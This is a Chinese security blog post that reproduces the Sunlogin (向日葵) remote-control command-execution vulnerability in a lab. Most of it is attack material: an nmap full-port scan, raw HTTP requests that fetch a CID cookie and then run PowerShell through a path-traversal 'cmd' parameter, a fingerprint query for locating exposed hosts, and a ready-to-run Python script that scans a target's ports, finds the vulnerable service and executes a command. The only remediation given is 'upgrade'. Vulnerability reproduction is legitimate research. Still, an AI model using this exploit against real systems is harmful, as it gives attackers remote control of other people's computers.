---
title: sunlogin_rce复现
date: 2022-02-18
categories: tool
tags:
- 复现
- rce
---

记录一下向日葵rce复现和端口扫描学习。

<!-- more -->

## 0x00 简介

```
向日葵是一款免费的，集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。
```

## 0x01 漏洞概述

```
https://www.cnvd.org.cn/flaw/show/CNVD-2022-1027
上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。
```

## 0x02 影响版本

```
上海贝锐信息科技股份有限公司 向日葵个人版for Windows 11.0.0.33
```

## 0x03 环境搭建

目前官网只有最新版可以下载V 12.5.1.44969（2022.02），之前可以根据爆破versionid来下载不同版本，但没成功，直接找了漏洞版本

![](https://0314valen.github.io/images/img/sunlogin_rce/0.png)

![](https://0314valen.github.io/images/img/sunlogin_rce//1.png)

这边用的版本是向日葵远程控制_11.0.0.33162，可以直接免安装运行

![](https://0314valen.github.io/images/img/sunlogin_rce//2.png)

运行左下角可以看到绿色连接服务器成功，并且有识别码和验证码，这样基本上环境就弄好了。

## 0x04 漏洞复现

客户端在运行的时候会开启一个40000+的端口，首先用端口扫描得到这个端口，我用的是nmap

```
nmap -sS -p 1-65535 -v 192.168.3.198
```

![](https://0314valen.github.io/images/img/sunlogin_rce//3.png)

可以看到存在误报，所以需要经过尝试后可以确定是56399端口

![](https://0314valen.github.io/images/img/sunlogin_rce//4.png)

然后构造如下数据包拿到CID:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1添加到cookie:CID

```
GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
Host: 192.168.3.198:56399
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![](https://0314valen.github.io/images/img/sunlogin_rce//5.png)

也可以使用如下数据包得到CID、设备的公网、内网地址等信息

其中username和password分别表示主机的账号和密码

```
GET /cgi-bin/login.cgi?act=login&username=admin&password=admin&hostname=1 HTTP/1.1
Host: 192.168.3.198:56399
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Cookie: CID=6onb943qKJoXQGAmr1BKArugFlO9949g
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![](https://0314valen.github.io/images/img/sunlogin_rce//6.png)

拿到CID之后构造如下数据包就能RCE

```
GET /check?cmd=ping../../../../../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami HTTP/1.1
Host: 192.168.3.198:56399
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Cookie: CID=0243aFf9X19BCrB9vrfSLludf4jc9lai
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![](https://0314valen.github.io/images/img/sunlogin_rce//7.png)

###### 检测脚本

指纹信息

```
body="Verification failure" && body="false" && header="Cache-Control: no-cache" && header="Content-Length: 46" && header="Content-Type: application/json"
```

python版本exp：

```
import json
from datetime import datetime
import socket
import pyfiglet
import requests
from multiprocessing.dummy import Pool as ThreadPool
from fake_useragent import UserAgent
open_port = []

class ScanPort:
    def __init__(self, ip):
        # 初始化设置相关参数
        self.ip = ip  # 需要扫描的IP
        self.host = None

    def scan(self, port):
        # 执行扫描操作
        try:
            # 建立socket连接
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 地址簇,套接字类型
            res = s.connect_ex((self.ip, port))
            if res == 0:
                print('IP地址：{0}\tPort：{1}\t的状态是open'.format(self.ip, port))
                open_port.append(port)
        except Exception as e:
            print(e)
        finally:
            s.close()

    def setting(self):
        # 设置线程数和端口信息
        port = [i for i in range(1, 65535)]  # 所有的端口列表
        # host = socket.gethostbyname(self.ip)#设置主机名
        socket.setdefaulttimeout(0.5)  # 设置超时
        t1 = datetime.now()  # 开始时间
        pool = ThreadPool(processes=1000)
        pool.map(self.scan, port)
        pool.close()
        pool.join()
        print('[***] 端口扫描已完成，耗时：', datetime.now() - t1)


def poc(ip):
    for port in open_port:
        url = 'http://'+ip+':'+str(port)+'/cgi-bin/rpc?action=verify-haras'
        try:
            res=requests.get(url,verify=False,timeout=1).text
            if 'verify_string' in res:
                print('[***]端口：{0}存在漏洞\n[***]url为：{1}'.format(str(port),url))
                rce('http://'+ip+':'+str(port))
                exit(0)
        except Exception as e:
            pass
def rce(url):
    ua = UserAgent().random#随机UA
    get_cid=json.loads(requests.get(url+'/cgi-bin/rpc?action=verify-haras', verify=False, timeout=1).text)['verify_string']
    print(get_cid)
    headers={
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "CID =" + get_cid
    }
    payload=url+'/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami'
    req = requests.get(payload, headers=headers, verify=False).text

    print('[***]'+url+'存在漏洞\n'+req)

if __name__ == '__main__':
    print(pyfiglet.figlet_format('sunlogin_rce'))
    ip = input('[*]输入要扫描的IP地址：')
    print('[***]开始对端口进行扫描')
    ScanPort(ip).setting()
    poc(ip)
```

## 0x05 修复方式

```
升级最新版本
```

## 参考链接：

```
https://www.cnvd.org.cn/flaw/show/CNVD-2022-1027
https://0314valen.github.io/images/img/sunlogin_rce/向日葵远程控制_11.0.0.33162.exe
```
